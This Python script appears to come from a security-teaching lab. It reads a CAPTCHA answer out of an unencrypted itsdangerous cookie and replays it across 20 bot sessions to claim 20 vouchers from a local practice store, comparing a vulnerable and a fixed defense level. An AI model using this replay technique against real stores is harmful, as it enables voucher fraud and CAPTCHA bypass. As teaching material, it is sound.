"""
Chapter 5, Round 2 attack: read the answer, then replay it (section 5.3).

Objective: turn ONE CAPTCHA into 20 vouchers without solving anything.

  1. Ask for the voucher. The store answers with a CAPTCHA, and the `captcha` cookie it set
     carries an itsdangerous payload: base64 JSON with a signature on the end. Signed, not encrypted.
  2. Read the answer out of the cookie. No key needed.
  3. From 20 fresh sessions, set the same cookie and post the same challenge id + answer
     to /api/challenge/verify, then claim the voucher.

Expected:
  DEFENSE_LEVEL=1                    20/20 (no CAPTCHA on the promo yet)
  DEFENSE_LEVEL=2, shipped store     20/20 vouchers from one challenge
  DEFENSE_LEVEL=2, fixed store       0/20: no answer in any cookie, and the bot has no solver
                                     yet (Round 3); captcha_reason says why a replay fails

    python attacks/round2_cookie_replay.py
"""

import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "tools"))
import labclient  # noqa: E402,F401  (the localhost guard runs on import)
import captcha_kit as ck  # noqa: E402
import base64  # noqa: E402
import json  # noqa: E402
import zlib  # noqa: E402

ATTEMPTS = 20


def read_cookie(value):
    """Decode an itsdangerous payload without knowing the key."""
    if not value:
        return None
    payload = value.split(".")[1] if value.startswith(".") else value.split(".")[0]
    raw = base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4))
    if value.startswith("."):          # leading dot = zlib-compressed
        raw = zlib.decompress(raw)
    return json.loads(raw)


def run():
    first = ck.bot("cookie_replay")
    ck.unlock(first)
    status, body = ck.redeem(first)
    if status == 200:
        return ck.report("round2_cookie_replay", ATTEMPTS, 1, leaked=None, challenge=None, note="no CAPTCHA at this level",
                         reasons={})
    err = body.get("error", {})
    cid = (err.get("payload") or {}).get("id")
    cookie = first.http.cookies.get("captcha")
    leaked = read_cookie(cookie)
    answer = (leaked or {}).get("answer", "")

    vouchers = 0
    for i in range(ATTEMPTS):
        c = first if i == 0 else ck.bot("cookie_replay", ip=first.ip)
        if i:
            ck.unlock(c)
            if cookie:
                c.set_cookie("captcha", cookie)                   # the same solved cookie
        if ck.answer_challenge(c, cid or "", answer).status_code == 200:
            vouchers += ck.redeem(c)[0] == 200
    return ck.report("round2_cookie_replay", ATTEMPTS, vouchers, leaked=leaked, challenge=cid,
                     reasons=ck.reasons(first.actor, "captcha_reason"))


if __name__ == "__main__":
    s = run()
    print("=== Round 2: read the answer from the cookie, then replay ===")
    if s["challenge"] is None:
        print("  no CAPTCHA on the promo at this level")
    elif s["leaked"]:
        print(f"  cookie payload (no key needed): {s['leaked']}")
    else:
        print("  no answer in any cookie: we'd need a solver (Round 3)")
    print(f"  vouchers: {s['succeeded']}/{s['attempted']} from one challenge")
    for reason, n in s["reasons"].items():
        print(f"  refused x{n}: {reason}")
    ck.emit(s)
